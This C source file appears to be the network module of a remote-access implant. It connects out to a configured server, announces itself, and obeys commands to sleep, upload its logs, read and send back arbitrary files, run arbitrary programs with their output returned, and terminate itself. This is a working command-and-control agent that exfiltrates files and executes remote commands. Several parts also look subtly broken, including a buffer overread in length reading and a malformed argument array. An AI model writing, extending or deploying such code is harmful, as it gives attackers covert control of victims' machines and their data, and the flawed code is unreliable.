/**
 * filename: network.c
 * description: create new socket connection with the server, and handle the recv commands
 */

// C includes
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <errno.h>

// User includes
#include "network.h"
#include "tool.h"
#include "log.h"
#include "file.h"
#include "exec.h"

static network_status_t send_cmd_result(int fd,
                                        int32_t ret_code,
                                        const uint8_t *payload,
                                        size_t payload_len)
{
    network_status_t status = NETWORK_FAILED;
    int32_t net_ret_code = htonl(ret_code);
    uint32_t net_payload_length = htonl(payload_len);

    ASSERT_RET_EQ(FILE_OK, write_all(fd, (uint8_t*)(&net_ret_code), sizeof(net_ret_code)), cleanup, "write ret code failed");
    ASSERT_RET_EQ(FILE_OK, write_all(fd, (uint8_t*)(&net_payload_length), sizeof(net_payload_length)), cleanup, "write length failed");

    if (payload_len > 0)
    {
	ASSERT_NOT_NULL(payload, cleanup, "payload was NULL");	
        ASSERT_RET_EQ(FILE_OK, write_all(fd, payload, payload_len), cleanup, "write buffer failed");
    }

    status = NETWORK_OK;
cleanup:
    return status;
}

static network_status_t read_command(int fd,
                                    uint8_t **out_payload,
                                    size_t *out_payload_len,
                                    uint8_t *out_code)
{
    network_status_t status = NETWORK_FAILED;
    file_status_t file_status = FILE_FAILED;
    uint32_t net_payload_len = 0;
    uint8_t *payload = NULL;

    ASSERT_NOT_NULL(out_payload, cleanup, "out_payload NULL");
    ASSERT_NOT_NULL(out_payload_len, cleanup, "out_payload_len NULL");
    ASSERT_NOT_NULL(out_code, cleanup, "out_code NULL");
   
    file_status = read_all(fd, out_code, sizeof(*out_code));

    if (FILE_EOF == file_status)
    {
	status = NETWORK_STOP_COMM;
	goto cleanup;
    }

    ASSERT_RET_EQ(FILE_OK, file_status, cleanup, "failed reading cmd code");
    ASSERT_RET_EQ(FILE_OK, read_all(fd, (uint8_t*)(&net_payload_len), sizeof(*out_payload_len)), cleanup,
		    "failed reading length");
    *out_payload_len = ntohl(net_payload_len);

    if (*out_payload_len > 0)
    {
	payload = malloc(*out_payload_len);
        ASSERT_NOT_NULL(payload, cleanup, "malloc payload failed: %s", strerror(errno));
        ASSERT_RET_EQ(FILE_OK, read_all(fd, payload, *out_payload_len), cleanup, "failed reading payload");
    }

    status = NETWORK_OK;
cleanup:
    if (NETWORK_OK != status && NULL != payload)
    {
        free(payload);
    }

    return status;
}

static cmd_status_t handle_unload_logs(uint8_t **out_buf,
                                           size_t *out_size)
{
    cmd_status_t status = CMD_FATAL;

    ASSERT_NOT_NULL(out_buf, cleanup, "out_buf NULL");
    ASSERT_NOT_NULL(out_size, cleanup, "out_size NULL");
    
    ASSERT_RET_EQ(LOG_OK, log_read_all(out_buf, out_size), cleanup, "log_read_all failed");

    status = CMD_OK;
cleanup:
    return status;
}

static cmd_status_t handle_get_file(const uint8_t *payload,
				    size_t payload_size,
                                        uint8_t **out_buf,
                                        size_t *out_size)
{
    cmd_status_t status = CMD_FATAL;
    file_status_t file_status = FILE_FAILED;
    char *path = NULL;

    ASSERT_NOT_NULL(payload, cleanup, "payload NULL");
    ASSERT_NOT_NULL(out_buf, cleanup, "out_buf NULL");
    ASSERT_NOT_NULL(out_size, cleanup, "out_size NULL");


    path = malloc(payload_size + 1);
    ASSERT_NOT_NULL(path, cleanup, "malloc failed: %s", strerror(errno));
    memcpy(path, payload, payload_size);
    path[payload_size] = '\0';

    file_status = read_file_from_path(path, out_buf, out_size);
    if (FILE_INACCESSIBLE == file_status)
    {
	status = CMD_ERROR;
	goto cleanup;
    }
    ASSERT_RET_EQ(FILE_OK, file_status, cleanup, "log_read_all failed");

    status = CMD_OK;
cleanup:
    if (NULL != path)
    {
	free(path);
	path = NULL;
    }
    return status;
}

static cmd_status_t handle_sleep_command(const uint8_t *payload,
                                             unsigned int *out_sleep_time)
{
    cmd_status_t status = CMD_FATAL;

    ASSERT_NOT_NULL(payload, cleanup, "payload NULL");
    ASSERT_NOT_NULL(out_sleep_time, cleanup, "out_sleep_time NULL");

    *out_sleep_time = ntohl((unsigned int)(*payload));
    status = CMD_OK;

cleanup:
    return status;
}


static cmd_status_t parse_exec_payload(const uint8_t *payload,
                                           size_t payload_len,
                                           uint32_t *timeout_ms_out,
                                           char **path_out,
                                           char **args_out)
{
    cmd_status_t status = CMD_FATAL;
    const uint8_t *cursor = payload;
    const uint8_t *end = payload + payload_len;
    char *tmp = NULL;
    uint32_t field = 0;

    ASSERT_NOT_NULL(payload, cleanup, "payload NULL");
    ASSERT_NOT_NULL(timeout_ms_out, cleanup, "timeout NULL");
    ASSERT_NOT_NULL(path_out, cleanup, "path NULL");
    ASSERT_NOT_NULL(args_out, cleanup, "args NULL");

    if (payload_len < sizeof(uint32_t) * 3)
    {
        ERROR(cleanup, "payload too small");
    }

    // timeout
    field = ntohl(*(const uint32_t *)cursor);
    *timeout_ms_out = field;
    cursor += sizeof(uint32_t);

    // path len
    field = ntohl(*(const uint32_t *)cursor);
    cursor += sizeof(uint32_t);

    if (0 == field || (size_t)(end - cursor) < field)
    {
        ERROR(cleanup, "invalid path_len");
    }

    // path
    tmp = malloc(field + 1);
    ASSERT_NOT_NULL(tmp, cleanup, "malloc failed: %s", strerror(errno));
    memcpy(tmp, cursor, field);
    tmp[field] = '\0';
    *path_out = tmp;
    cursor += field;

    // args len 
    field = ntohl(*(const uint32_t *)cursor);
    cursor += sizeof(uint32_t);

    // args
    if (0 != field)
    {
        if ((size_t)(end - cursor) < field)
        {
            ERROR(cleanup, "invalid args_len");
        }

    	tmp = malloc(field + 2);
    	ASSERT_NOT_NULL(tmp, cleanup, "malloc failed: %s", strerror(errno));
   	memcpy(tmp, cursor, field);

	// NULL terminate the last arg
    	tmp[field] = '\0';
	// add final NULL terminator as the last arg
    	tmp[field + 1] = '\0';
        *args_out = tmp;
    }
    else
    {
        *args_out = NULL;
    }

    status = CMD_OK;

cleanup:
    if (CMD_OK != status)
    {
	if (NULL != *path_out)
	{
	    free(*path_out);
	    *path_out = NULL;
	}
	if (NULL != *args_out)
	{
	    free(*args_out);
	    *args_out = NULL;
	}
    }
    return status;
}

static cmd_status_t build_exec_response(int exit_code,
                                            size_t stdout_size,
                                            const char *stdout_buf,
                                            size_t stderr_size,
                                            const char *stderr_buf,
                                            uint8_t **out_buf,
                                            size_t *out_size)
{
    cmd_status_t status = CMD_FATAL;
    uint8_t *buf = NULL;
    uint8_t *ptr = NULL;
    size_t total = 0;

    ASSERT_NOT_NULL(stdout_buf, cleanup, "stdout_buf is NULL");
    ASSERT_NOT_NULL(stderr_buf, cleanup, "stderr_buf is NULL");
    ASSERT_NOT_NULL(out_buf, cleanup, "out_buf is NULL");
    ASSERT_NOT_NULL(out_size, cleanup, "out_size is NULL");

    if (stdout_size > UINT32_MAX || stderr_size > UINT32_MAX)
    {
        ERROR(cleanup, "streams too large stdout %d, stderr %d", stdout_size, stderr_size);
    }

    total = sizeof(int32_t) +
            sizeof(uint32_t) + stdout_size +
            sizeof(uint32_t) + stderr_size;

    buf = malloc(total);
    ASSERT_NOT_NULL(buf, cleanup, "malloc failed: %s", strerror(errno));

    ptr = buf;

    *(int32_t *)ptr = htonl(exit_code);
    ptr += sizeof(int32_t);

    // cast safe becuase we checked size is smaller than UINT32_MAX
    *(uint32_t *)ptr = htonl((uint32_t)stdout_size);
    ptr += sizeof(uint32_t);

    if (0 != stdout_size)
    {
        memcpy(ptr, stdout_buf, stdout_size);
        ptr += stdout_size;
    }

    // cast safe becuase we checked size is smaller than UINT32_MAX
    *(uint32_t *)ptr = htonl((uint32_t)stderr_size);
    ptr += sizeof(uint32_t);

    if (0 != stderr_size)
    {
        memcpy(ptr, stderr_buf, stderr_size);
    }

    *out_buf = buf;
    *out_size = total;
    status = CMD_OK;

cleanup:
    return status;
}

static cmd_status_t handle_exec_command(const uint8_t *payload,
                                            size_t payload_len,
                                            uint8_t **out_buf,
                                            size_t *out_size)
{
    cmd_status_t status = CMD_FATAL;
    char *path = NULL;
    char **args = NULL;
    uint32_t timeout_ms = 0;

    char *out_stdout = NULL;
    size_t stdout_size = 0;
    char *out_stderr = NULL;
    size_t stderr_size = 0;
    int exit_code = 0;

    exec_status_t exec_status = EXEC_FAILED;

    ASSERT_NOT_NULL(payload, cleanup, "payload NULL");
    ASSERT_NOT_NULL(out_buf, cleanup, "out_buf NULL");
    ASSERT_NOT_NULL(out_size, cleanup, "out_size NULL");

    status = parse_exec_payload(payload, payload_len, &timeout_ms, &path, (char **)&args);
    ASSERT_RET_EQ(CMD_OK, status, cleanup, "parse failed");

    exec_status = exec_run(path, args, &stdout_size, &out_stdout, &stderr_size, &out_stderr, &exit_code, timeout_ms);

    if (EXEC_INACCESSIBLE == exec_status)
    {
	status = CMD_ERROR;
	goto cleanup;
    }
    ASSERT_RET_EQ(EXEC_OK, exec_status, cleanup, "exec_run failed");

    status = build_exec_response(exit_code, stdout_size, out_stdout, stderr_size, out_stderr, out_buf, out_size);
    ASSERT_RET_EQ(CMD_OK, status, cleanup, "pack failed");

    status = CMD_OK;

cleanup:
    if (NULL != path)
    {
        free(path);
    }
    if (NULL != args)
    {
        free(args);
    }
    return status;
}

static network_status_t send_hello(int sock_fd,
                                const tool_t *tool)
{
    network_status_t status = NETWORK_FAILED;
    uint8_t version = 1;

    ASSERT_RET_EQ(FILE_OK, write_all(sock_fd, &version, sizeof(version)), cleanup, "couldn't send versin");
    ASSERT_RET_EQ(FILE_OK, write_all(sock_fd, (uint8_t *)(tool->name), sizeof(tool->name)), cleanup, "couldn't send tool name");

    status = NETWORK_OK;

cleanup:
    return status;
}

static network_status_t handle_command_loop(int sock_fd,
                                            unsigned int *out_sleep_duration,
					    int *out_should_die)
{
    network_status_t status = NETWORK_FAILED;
    cmd_status_t cmd_status = CMD_FATAL;
    network_status_t read_cmd_res = NETWORK_FAILED;
    uint8_t *payload = NULL;
    size_t payload_len = 0;
    uint8_t *res_buf = NULL;
    size_t res_len = 0;
    uint8_t code = 0;
    int32_t ret_code = 0;
 	
    *out_should_die = 0;

    while (1)
    {
        read_cmd_res = read_command(sock_fd, &payload, &payload_len, &code);

	// if couldn't read more messages, just sleep default
        if (NETWORK_STOP_COMM == read_cmd_res)
        {
            *out_sleep_duration = 0;
            status = NETWORK_OK;
            break;
        }

	ASSERT_RET_EQ(NETWORK_OK, read_cmd_res, cleanup, "read_command failed");

        ret_code = 0;
        cmd_status = CMD_FATAL;

        switch (code)
        {
            case CMD_SLEEP:
                cmd_status = handle_sleep_command(payload, out_sleep_duration);
                break;

            case CMD_UNLOAD_LOGS:
                cmd_status = handle_unload_logs(&res_buf, &res_len);
                break;

            case CMD_GET_FILE:
                cmd_status = handle_get_file(payload, payload_len, &res_buf, &res_len);
                break;

            case CMD_EXEC_COMMAND:
                cmd_status = handle_exec_command(payload, payload_len, &res_buf, &res_len);
                break;
	   case CMD_DIE:
		cmd_status = CMD_OK;
		*out_should_die = 1;
		break;
            default:
                ERROR(cleanup, "unknown command: %u", code);
                break;
        }
	
	ASSERT_RET_NE(CMD_FATAL, cmd_status, cleanup, "cmd returned fatal error");
        if (CMD_OK != cmd_status)
        {
	    // generic command failed
            ret_code = -1;
        }
	
	ASSERT_RET_EQ(NETWORK_OK, send_cmd_result(sock_fd, ret_code, res_buf, res_len), cleanup, "send_cmd_result failed");

        if (CMD_SLEEP == code || CMD_DIE == code)
        {
            break;
        }

        if (payload)
        {
            free(payload);
            payload = NULL;
        }

        if (res_buf)
        {
            free(res_buf);
            res_buf = NULL;
        }
    }

    status = NETWORK_OK;

cleanup:
    if (payload)
    {
        free(payload);
	payload = NULL;
    }

    if (res_buf)
    {
        free(res_buf);
	res_buf = NULL;
    }

    return status;
}

static network_status_t connect_to_tool(const tool_conf_t *conf, int * out_fd)
{
    int sock_fd = -1;
    struct sockaddr_in addr = {0};
    network_status_t status = NETWORK_FAILED;
    int ret = -1;

    ASSERT_NOT_NULL(conf, done, "conf is NULL");
    ASSERT_NOT_NULL(out_fd, done, "out_fd is NULL");

    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    ASSERT_RET_NE(-1, sock_fd, done, "Failed to create socket: %s", strerror(errno));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(conf->port);

    ret = inet_pton(AF_INET, conf->ip, &addr.sin_addr);
    ASSERT_RET_EQ(1, ret, done, "Invalid IP address: %s", conf->ip);
    ret = connect(sock_fd, (struct sockaddr *)&addr, sizeof(addr));
    ASSERT_RET_EQ(0, ret, done, "Failed to connect to %s:%d  %s", conf->ip, conf->port, strerror(errno));

    *out_fd = sock_fd; 
    status = NETWORK_OK;
done:
    if (NETWORK_FAILED == status && -1 != sock_fd)
    {
        close(sock_fd);
    }

    return status;
}

network_status_t communicate(const tool_t *tool, unsigned int *out_sleep_duration, int * out_should_die)
{
    network_status_t status = NETWORK_FAILED;
    int sock_fd = -1;

    ASSERT_NOT_NULL(tool, cleanup, "tool is NULL");
    ASSERT_NOT_NULL(out_sleep_duration, cleanup, "out_sleep_duration is NULL");
    ASSERT_NOT_NULL(out_should_die, cleanup, "out_should_die is NULL");

    ASSERT_RET_EQ(NETWORK_OK, connect_to_tool(&tool->conf, &sock_fd), cleanup, "connect_to_tool failed");

    ASSERT_RET_EQ(NETWORK_OK, send_hello(sock_fd, tool), cleanup, "send_hello failed");

    status = handle_command_loop(sock_fd, out_sleep_duration, out_should_die);

cleanup:
    if (-1 != sock_fd)
    {
        close(sock_fd);
    }

    return status;
}



